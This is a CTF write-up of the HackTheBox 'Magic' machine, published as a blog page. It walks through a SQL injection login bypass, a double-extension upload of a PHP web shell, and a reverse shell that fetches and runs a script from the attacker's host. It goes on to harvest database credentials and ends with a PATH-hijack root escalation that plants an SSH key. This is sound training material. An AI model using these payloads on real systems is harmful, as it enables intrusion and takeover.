@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Magic just retired on HackTheBox. It is a Medium difficulty Linux box that required a lot enumeration in order to not miss any crucial information. While rated Medium I would advise this box for beg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Magic">
+<meta property="og:url" content="https://hg8.sh/posts/magic/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Magic just retired on HackTheBox. It is a Medium difficulty Linux box that required a lot enumeration in order to not miss any crucial information. While rated Medium I would advise this box for beg">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82157773-c1560800-9883-11ea-8e96-c3c17d69a254.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80870233-6f1ebf80-8ca5-11ea-8506-524384c3fea4.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80872891-2c64e380-8cb5-11ea-8a9b-d85d5dced477.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/80873448-e90c7400-8cb8-11ea-8203-610de9125ed7.png">
+<meta property="article:published_time" content="2020-08-21T22:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-21T14:31:11.990Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="sqli">
+<meta property="article:tag" content="magic">
+<meta property="article:tag" content="upload">
+<meta property="article:tag" content="double extension">
+<meta property="article:tag" content="rce">
+<meta property="article:tag" content="web shell">
+<meta property="article:tag" content="trace">
+<meta property="article:tag" content="suid">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82157773-c1560800-9883-11ea-8e96-c3c17d69a254.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+     
+    <title>HackTheBox - Magic :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/posts/traceback/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+    </span>
+    <br/>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Double-Extension"><span class="toc-number">1.2.</span> <span class="toc-text">Abusing Double Extension</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-and-launch-of-Reverse-Shell"><span class="toc-number">1.3.</span> <span class="toc-text">Upload and launch of Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-theseus"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot www-data -&gt; theseus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Magic
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-21T22:00:00.000Z" itemprop="datePublished">22-08-2020</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      8 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="587" alt="magic-hackthebox" src="https://user-images.githubusercontent.com/9076747/82157773-c1560800-9883-11ea-8e96-c3c17d69a254.png">
+
+<p>Magic just retired on HackTheBox. It is a Medium difficulty Linux box that required a lot enumeration in order to not miss any crucial information. While rated Medium I would advise this box for beginner trying to make the jump from Easy boxes since there is not a lot of rabbit hole and both user and root flag are quite logical and straightforward to get. </p>
+<p><strong>Tl;Dr:</strong> The user flag is accessible after multiple steps. First you have to bypass a restricted file upload form to upload and run a Web-Shell as <code>www-data</code> user. With this access you can find MySQL credentials in a configuration file. Dumping the database allows you get <code>theseus</code> password and access his user account where the fag is.<br>The root flag was accessible by abusing a custom binary that could be run as <code>root</code> with <code>sudo</code> without password by editing the <code>$PATH</code> variable to make the binary run your custom commands. </p>
+<p>Alright! Let’s get into the details now!</p>
+<hr>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.185 magic.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>and let’s start!</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC magic.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> magic.htb (10.10.10.185)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Magic Portfolio</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>We have a classical web app running on port 80 and the SSH port 22 open.</p>
+<p>Opening <code>http://magic.htb</code> display a following page:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80870233-6f1ebf80-8ca5-11ea-8506-524384c3fea4.png" alt="magic homepage"></p>
+<p>At first look, it seems like a classical image gallery website. It doesn’t seem we can access anything without login in. </p>
+<p>Out of curiosity I tried a few common SQL injection on the login form and surprisingly the infamous <code>&#39; or 1--</code> worked. Once again this is a good reminder to never skip the basics…</p>
+<p>Logging in with <code>&#39; or 1--</code> as username and password brings us to the following upload form:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80872891-2c64e380-8cb5-11ea-8a9b-d85d5dced477.png" alt="magic upload form"></p>
+<p>As usual with Upload form the best way to go is to upload a Web-Shell to gain Remote Code execution on the back-end. We knows the server run PHP so let’s try to upload a simple php file containing <code>&lt;?php phpinfo();</code>. </p>
+<p>With no surprises the server returns the following message:</p>
+<blockquote>
+<p>Sorry, only JPG, JPEG &amp; PNG files are allowed.</p>
+</blockquote>
+<p>From here we can try few of the most common file upload restriction bypass:</p>
+<ul>
+<li>Changing extension (<code>test.PHp</code>, <code>test.php5</code>)</li>
+<li>Content-type bypass</li>
+<li>Double extension (<code>test.php.jpg</code>, <code>test.jpg.php</code>)</li>
+<li>Null Character (<code>test.php%00.jpg</code>)</li>
+<li>Using GIF89a; header</li>
+</ul>
+<h3 id="Abusing-Double-Extension"><a href="#Abusing-Double-Extension" class="headerlink" title="Abusing Double Extension"></a>Abusing Double Extension</h3><p>The only method that worked is the double extension attack. As a reminder here is the issue with double extension on some Apache configuration:</p>
+<blockquote>
+<p>Files can have more than one extension; the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. </p>
+<p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime.html#multipleext" target="_blank" rel="noopener">Apache Documentation - Files with Multiple Extensions</a></p>
+</blockquote>
+<p>Therefore if you have a file in the following format : <code>hg8.php.123</code> it may be interpreted as a PHP file by Apache Server (depending on the configuration). </p>
+<p>In our case if the server is validating the file extension and the mime-type it should be possible to upload a image file appended with php code and with the following extension <code>.php.jpg</code>  . This files will pass all the upload form checks but will be able interpreted as PHP by Apache.</p>
+<p>To clarify the idea, let’s see in practice.</p>
+<ol>
+<li>Let’s download a very small (but valid) JPEG image. I will use one from this <a href="https://github.com/mathiasbynens/small" target="_blank" rel="noopener">repository</a>:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg</span><br><span class="line">[hg8@archbook ~]$ cp jpeg.jpg hg8.php.jpg</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Append PHP code to the image with a simple <code>echo</code>:</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();"</span> &gt;&gt; hg8.php.jpg</span><br><span class="line">[hg8@archbook ~]$ cat hg8.php.jpg</span><br><span class="line">C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">? &lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Upload the file to the server.</li>
+</ol>
+<p>Once uploaded we get the following success message:</p>
+<blockquote>
+<p>The file hg8.php.jpg has been uploaded.</p>
+</blockquote>
+<p>Following the pattern of other images displayed on the homepage, we can guess that our file path is available at <code>http://magic.htb/images/uploads/hg8.php.jpg</code>. Let’s open it:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/80873448-e90c7400-8cb8-11ea-8203-610de9125ed7.png" alt="magic double extension upload"></p>
+<p>Bingo, we got php to execute on the server. </p>
+<h3 id="Upload-and-launch-of-Reverse-Shell"><a href="#Upload-and-launch-of-Reverse-Shell" class="headerlink" title="Upload and launch of Reverse Shell"></a>Upload and launch of Reverse Shell</h3><p>Let’s do the same to upload a reverse shell on the server using php. Here is one way to do so:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> exec(<span class="string">"wget 10.10.14.7:8000/hg8.py -O /tmp/hg8.py"</span>); </span><br><span class="line">exec(<span class="string">"python3 /tmp/hg8.py"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Let’s open our listener: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>Then after upload and opening our php/image file a new connection appear:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.185:46348</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>We have a shell as <code>www-data</code>, that’s a good start. First let’s upgrade our shell to get a fully interactive one and ease our work:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ python3 -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">www-data@ubuntu:/$</span><br><span class="line">&lt;Ctrl+Z&gt;</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ stty size</span><br><span class="line">54 100</span><br><span class="line">[hg8@archbook ~]$ stty raw -<span class="built_in">echo</span></span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line">www-data@ubuntu:/$ reset</span><br><span class="line">www-data@ubuntu:/$ <span class="built_in">export</span> SHELL=bash</span><br><span class="line">www-data@ubuntu:/$ <span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">www-data@ubuntu:/$ stty rows 54 columns 100</span><br></pre></td></tr></table></figure>
+
+<p>Alright! We can now do a bit of recon for interesting files. Like in most of web app we can often find credentials in a <code>config.php</code> or <code>database.php</code> file. This one followed the rule:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ cat /var/www/Magic/db.php5</span><br><span class="line">&lt;?php</span><br><span class="line">class Database</span><br><span class="line">&#123;</span><br><span class="line">    private static <span class="variable">$dbName</span> = <span class="string">'Magic'</span> ;</span><br><span class="line">    private static <span class="variable">$dbHost</span> = <span class="string">'localhost'</span> ;</span><br><span class="line">    private static <span class="variable">$dbUsername</span> = <span class="string">'theseus'</span>;</span><br><span class="line">    private static <span class="variable">$dbUserPassword</span> = <span class="string">'iamkingtheseus'</span>;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Pivot-www-data-gt-theseus"><a href="#Pivot-www-data-gt-theseus" class="headerlink" title="Pivot www-data -&gt; theseus"></a>Pivot www-data -&gt; theseus</h3><p>Good, we got the MySQL database credentials. Let’s connect to the database to see if we can find valuable informations and maybe other user accounts details:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ mysql -u theseus -p</span><br><span class="line">Command <span class="string">'mysql'</span> not found.</span><br><span class="line">www-data@ubuntu:/$</span><br></pre></td></tr></table></figure>
+
+<p>Well that sucks. Maybe another binary can help us access the database ? </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ find /usr/bin -name <span class="string">"*sql*"</span></span><br><span class="line">find /usr/bin -name <span class="string">"*sql*"</span></span><br><span class="line">/usr/bin/mysqloptimize</span><br><span class="line">/usr/bin/mysqldump</span><br><span class="line">/usr/bin/mysqladmin</span><br><span class="line">/usr/bin/mysqlshow</span><br><span class="line">/usr/bin/mysqld_safe</span><br><span class="line">/usr/bin/mysqlbinlog</span><br><span class="line">/usr/bin/mysqldumpslow</span><br><span class="line">/usr/bin/mysqlcheck</span><br><span class="line">/usr/bin/mysql_ssl_rsa_setup</span><br><span class="line">/usr/bin/mysqlimport</span><br><span class="line">/usr/bin/mysql_tzinfo_to_sql</span><br><span class="line">/usr/bin/mysql_upgrade</span><br><span class="line">/usr/bin/mysqlslap</span><br><span class="line">/usr/bin/mysql_secure_installation</span><br><span class="line">/usr/bin/mysqlrepair</span><br><span class="line">/usr/bin/mysqlanalyze</span><br><span class="line">/usr/bin/mysql_config_editor</span><br><span class="line">/usr/bin/mysqld_multi</span><br><span class="line">/usr/bin/mysql_plugin</span><br><span class="line">/usr/bin/mysql_embedded</span><br><span class="line">/usr/bin/mysql_install_db</span><br><span class="line">/usr/bin/mysqlpump</span><br><span class="line">/usr/bin/mysqlreport</span><br></pre></td></tr></table></figure>
+
+<p>That should be more than enough. Let’s use <code>mysqldump</code> to dump the whole database so we can take a look at it offline:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ mkdir /tmp/.hg8/</span><br><span class="line">www-data@ubuntu:/$ mysqldump -u theseus -p Magic &gt; /tmp/.hg8/base.sql</span><br><span class="line">Enter password:</span><br><span class="line">www-data@ubuntu:/$ cat /tmp/.hg8/base.sql</span><br><span class="line">-- MySQL dump 10.13  Distrib 5.7.29, <span class="keyword">for</span> Linux (x86_64)</span><br><span class="line">[...]</span><br><span class="line">INSERT INTO `login` VALUES (1,<span class="string">'admin'</span>,<span class="string">'Th3s3usW4sK1ng'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Can this be the credentials of <code>theseus</code> user ? Since it’s the only user on the box ? Let’s give it a try:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/$ su - theseus</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">theseus@ubuntu:~$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">theseus@ubuntu:~$ cat user.txt</span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxxxxxxa</span><br></pre></td></tr></table></figure>
+
+<p>To ease our future progress with a more confortable shell let’s add our SSH key to <code>theseus</code> user <code>authorized_keys</code> file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ <span class="built_in">echo</span> <span class="string">"ssh-rsa Axxxxxxxx hg8@htb.htb"</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line">theseus@ubuntu:~$ <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb theseus@magic.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)</span><br><span class="line">theseus@ubuntu:~$</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>While doing our classical recon for privilege escalation, a uncommon SUID binary pop out of our search:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ find /bin -perm -4000</span><br><span class="line">/bin/sysinfo</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>As it’s name indicate, running the binary displays system information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ /bin/sysinfo</span><br><span class="line">====================Hardware Info====================</span><br><span class="line">H/W path           Device      Class      Description</span><br><span class="line">=====================================================</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>Since this binary looks like homemade and running as <code>root</code> let’s dig a bit since it’s probably our way to privilege escalation.</p>
+<p>When running an unknown binary it’s always interesting to open it with <code>ltrace</code> to understand better what’s going on behind the hood. While doing so we can notice something valuable:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ ltrace  /bin/sysinfo 2&gt;&amp;1 | grep popen</span><br><span class="line">popen(<span class="string">"lshw -short"</span>, <span class="string">"r"</span>)                        = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">"fdisk -l"</span>, <span class="string">"r"</span>)                           = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">"cat /proc/cpuinfo"</span>, <span class="string">"r"</span>)                  = 0x5617225b8e80</span><br><span class="line">popen(<span class="string">"free -h"</span>, <span class="string">"r"</span>)                            = 0x5617225b8e80</span><br></pre></td></tr></table></figure>
+
+<p>The binary is actually running various other binaries to get the needed informations. But something dangerous is happening here. The binary path is only relative instead of being absolute like : <code>/usr/bin/lshw</code>.</p>
+<p>In Linux, when you type a command, like for example <code>cat</code> the system will look at the current user defined <code>$PATH</code> variable to know in which directory to search for the <code>cat</code> binary. By default, the <code>$PATH</code> variable contains the following locations:</p>
+<ul>
+<li>/usr/bin</li>
+<li>/usr/sbin</li>
+<li>/usr/local/bin</li>
+<li>/usr/local/sbin</li>
+<li>/bin</li>
+<li>/sbin</li>
+</ul>
+<p>If the system find the binary <code>cat</code> in the first folder it stop the search and run the binary. </p>
+<p>Since we have control over the current user $PATH variable, it’s should be possible to edit the list to something like so:</p>
+<ul>
+<li>/tmp/.hg8/</li>
+<li>/usr/bin</li>
+<li>/usr/sbin</li>
+<li>/usr/local/bin</li>
+<li>/usr/local/sbin</li>
+<li>/bin</li>
+<li>/sbin</li>
+</ul>
+<p>That mean if we put a rogue <code>cat</code> binary in <code>/tmp/.hg8/</code> , it’s this rogue binary that will get executed first whenever we type <code>cat</code>. See the issue now?</p>
+<p>Let’s use this knowledge to exploit the <code>sysinfo</code> SUID binary.</p>
+<p>First, let’s add our “rogue” directory to the current <code>$PATH</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ PATH=/tmp/.hg8/:<span class="variable">$PATH</span></span><br><span class="line">theseus@ubuntu:~$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp/.hg8/:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/<span class="built_in">local</span>/games:/snap/bin</span><br></pre></td></tr></table></figure>
+
+<p>Now, since we know that <code>/bin/sysinfo</code> is running <code>fdisk</code>, let’s create a fake <code>fdisk</code> file with our malicious content inside. For example we can append our SSH key to the <code>root</code> user <code>authorized_keys</code> file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ cat /tmp/.hg8/fdisk</span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mkdir -p /root/.ssh/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa AAxxxxxxxx hg8@htb.htb"</span> &gt;&gt; /root/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Done -hg8"</span></span><br></pre></td></tr></table></figure>
+
+<p>Now <code>sysinfo</code> should pick our fake <code>fdisk</code> and since <code>sysinfo</code> have SUID set our <code>fdisk</code> should be run as <code>root</code>. Let’s verify this:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">theseus@ubuntu:~$ /bin/sysinfo</span><br><span class="line">[...]</span><br><span class="line">Done -hg8</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>Looks like everything went fine, we should now be able to login as <code>root</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@magic.htb</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)</span><br><span class="line"></span><br><span class="line">root@ubuntu:~<span class="comment"># cat root.txt</span></span><br><span class="line">fxxxxxxxxxxxxxxxxxxxxxxxxxe</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Medium-Box/">Medium Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/double-extension/" rel="tag">double extension</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/magic/" rel="tag">magic</a>, <a class="tag-link" href="/tags/rce/" rel="tag">rce</a>, <a class="tag-link" href="/tags/sqli/" rel="tag">sqli</a>, <a class="tag-link" href="/tags/suid/" rel="tag">suid</a>, <a class="tag-link" href="/tags/trace/" rel="tag">trace</a>, <a class="tag-link" href="/tags/upload/" rel="tag">upload</a>, <a class="tag-link" href="/tags/web-shell/" rel="tag">web shell</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
